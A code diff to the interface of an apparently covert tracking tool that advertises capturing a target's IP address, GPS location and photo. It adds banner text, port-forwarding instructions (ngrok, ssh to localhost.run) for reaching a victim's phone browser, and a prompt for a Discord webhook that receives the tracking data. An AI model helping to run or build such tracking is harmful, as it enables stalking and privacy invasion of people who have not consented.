@@ -38,8 +38,11 @@ __________    _________   _______________ _______
  |    |   \/    ^   /\     /   |        \/    |    \
  |____|_  /\____   |  \___/   /_______  /\____|__  /
         \/      |__|                  \/         \/ 
-    Track User's Smartphone/Pc Ip, Gps Location and Capture target picture.
 
+'''
+
+des = r'''
+Track device location, and IP address, and capture a photo with device details.
 '''
 
 
@@ -95,7 +98,8 @@ def print_banners():
     """
     prints the program banners
     """
-    print(f'{R}{banner}{W}\n')
+    print(f'{R}{banner}{W}')
+    print(f'{Y}{des}{W}\n')
     print(f'{G}[+] {C}Version      : {W}{VERSION}')
     print(f'{G}[+] {C}Created By   : {W}Spyboy')
     print(f'{G} ╰➤ {C}Twitter      : {W}{twitter_url}')
@@ -107,16 +111,18 @@ def print_port_forwarding_instructions():
     """
     prints the port forwarding instruction
     """
-    print(f'\nTo port forward install ngrok or use ssh')
+    print(f'\n{R}NOTE: {Y}Make sure you port forward else it will not work on the smartphone browser \n')
+    print(f'{G}To port forward install ngrok or use ssh')
     print(f'{C}For ngrok port forward type  : {Y}ngrok http 8000')
-    print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localhost.run\n')
-    print(f'{C}track info will be sent to your discord webhook.\n')
+    print(f'{C}For ssh port forwarding type : {Y}ssh -R 80:localhost:8000 ssh.localhost.run')
+    print(f'{W}OR you can use whatever tool you want to port forward with.\n')
+    print(f'{G}Track info will be sent to your discord webhook.\n{W}')
 
 def get_new_discord_webhook():
     """
     gets the new discord webhook from user
     """
-    print(f'Enter Discord Webhoook url:')
+    print(f'{R}Enter Discord Webhoook url:{W}')
     dwebhook_input = input()
     file1 = open('dwebhook.js', 'w')
     file1.write(dwebhook_input)
